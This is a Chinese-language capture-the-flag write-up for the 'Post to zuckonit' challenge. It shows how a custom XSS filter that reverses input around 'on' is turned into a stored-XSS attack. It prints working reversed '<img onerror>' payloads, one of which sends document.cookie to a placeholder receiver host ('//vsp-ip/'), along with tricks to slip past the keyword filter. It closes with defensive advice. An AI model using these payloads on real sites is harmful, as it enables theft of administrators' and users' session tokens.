# Post to zuckonit

## 题目简述

题目允许提交内容并由管理员访问，目标是通过存储型 XSS 取得管理员 token。过滤器会替换 `script`，删除含尖括号的 `iframe`，并对 `on` 两侧的字符串做逆序拼接；`http`、`ptth`、`tpircs` 等字样也会被过滤。利用过滤器自身的逆序操作，可以让反写的 `<img onerror>` 在服务端处理后变回可执行标签。

## 解题过程

普通 payload：

```html
<script>alert(1)</script>
```

会被改成 `div`。大小写变化同样无效，说明过滤并非简单的大小写敏感替换。`iframe` 在带尖括号时会被正则 `</?[^>]*iframe[>]?` 命中，也不能直接使用。

测试事件属性时可以观察到，过滤器遇到 `on` 后会把相邻字符串逆序。于是先把预期标签整体反写，再在末尾放置触发过滤逻辑的 `on`。验证弹窗的输入为：

```text
>")1(trela"=rorreno x=crs gmi<on
```

处理后会形成等价的：

```html
<img src=x onerror="alert(1)">
```

确认执行后，把 JavaScript 改为将 `document.cookie` 发送到自己的接收端。官方样例使用反写 payload：

```text
>")eikooc.tnemucod+'/pi-spv//'(nepo.wodniw"=rorreno 'x'=crs gmi<on
```

过滤器处理后的核心逻辑等价于：

```javascript
window.open("//vsp-ip/" + document.cookie)
```

其中 `vsp-ip` 只是接收端占位符，应替换为比赛期间自己控制的日志服务。省略 `http:`、使用协议相对 URL `//host/path`，可以避开 `http` 过滤；若必须出现受过滤字符串，也可利用双写使删除一次后仍留下目标文本。管理员访问帖子后，从接收日志取出 token，再携带该 token 请求 `/flag` 即可得到 flag。

## 方法总结

遇到自定义 XSS 过滤时，应先用最小 payload 分别测量标签名、尖括号、属性名和 URL 协议的变换，而不是盲目堆叠编码。本题的漏洞来自“过滤器主动重排输入”，攻击者只需构造其逆变换。真实环境中依赖字符串黑名单无法可靠防御 XSS，应按输出上下文做编码并配合 CSP、HttpOnly cookie 和成熟的 HTML sanitizer。
